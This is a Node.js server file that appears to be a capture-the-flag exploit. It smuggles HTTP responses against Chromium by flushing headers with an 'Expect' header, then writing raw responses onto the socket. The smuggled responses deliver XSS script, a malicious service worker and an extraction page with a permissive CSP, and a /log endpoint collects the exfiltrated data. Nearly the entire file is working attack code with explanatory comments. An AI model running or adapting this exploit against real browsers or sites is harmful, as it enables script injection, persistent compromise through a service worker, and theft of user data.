const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = process.env.PORT || 12345;

function respond(res, code, type, body) {
  res.writeHead(code, { "content-type": type });
  res.end(body);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

http
  .createServer(async (req, res) => {
    const url = new URL(req.url, "http://localhost");

    if (url.pathname === "/index") {
      console.log("serving index");
      res.writeHead(200, { "content-type": "text/html" });
      res.end(`
<script src="xss.js?v1"></script>
<script src="xss.js?v2"></script>
<script src="xss.js?v3"></script>
<script src="xss.js?v4"></script>
<script src="xss.js?v5"></script>
<script src="xss.js?v6"></script>
<script src="xss.js?v7"></script>
<script src="xss.js?v8"></script>
    `);
      return;
    }
    if (url.pathname === "/xss.js") {
      const js = fs
        .readFileSync(path.join(__dirname, "static", "xss.js"))
        .toString();
      const resp = `
HTTP/1.1 200 OK\r
Content-Type: text/javascript\r
Content-Length: ${js.length}\r
Connection: keep-alive\r
\r
${js}`.slice(1);
      res.writeHead(200, {
        "content-type": "not/script", // triggers "block scripts just in case" (Content-Length: 0) but still can't be registered as service worker
        "content-length": resp.length,
        // node will flush header when sending `Expect` header
        // see: https://github.com/nodejs/node/blob/ed6f45bef86134533550924baa89fd92d5b24f78/lib/_http_outgoing.js#L587
        // this is to prevent chromium dropping connection when it detect extraneous response
        expect: "100-continue",
      });
      res.flushHeaders();
      await sleep(1000); // wait for the server the send the header first
      // to node, this will still be sent to the browser
      // but for browser, Content-Length: 0 tells it to ignore the response
      // the delay is to the make make think this is the response of the next request on the same connection
      res.socket.write(resp);
      res.end();
      return;
    }
    if (url.pathname === "/extract.js") {
      const js = fs
        .readFileSync(path.join(__dirname, "static", "extract.html"))
        .toString();
      const resp = `
HTTP/1.1 200 OK\r
Content-Type: text/html\r
Content-Security-Policy: connect-src *\r
Content-Length: ${js.length}\r
Connection: keep-alive\r
\r
${js}`.slice(1);
      res.writeHead(200, {
        "content-type": "not/script",
        "content-length": resp.length,
        expect: "100-continue",
      });
      res.flushHeaders();
      await sleep(1000);
      res.socket.write(resp);
      res.end();
      return;
    }
    if (url.pathname === "/sw.js") {
      const js = fs
        .readFileSync(path.join(__dirname, "static", "sw.js"))
        .toString();
      const resp = `
HTTP/1.1 200 OK\r
Content-Type: text/javascript\r
Content-Security-Policy: connect-src *\r
Content-Length: ${js.length}\r
Connection: keep-alive\r
\r
${js}`.slice(1);
      res.writeHead(200, {
        "content-type": "not/script",
        "content-length": resp.length,
        expect: "100-continue",
      });
      res.flushHeaders();
      await sleep(1000);
      res.socket.write(resp);
      res.end();
      return;
    }

    if (url.pathname === "/log") {
      console.log(req.url);
      return respond(res, 200, "text/plain", "ok");
    }
    respond(res, 404, "text/plain", "Not found");
  })
  .listen(PORT, () => console.log(`listening on :${PORT}`));
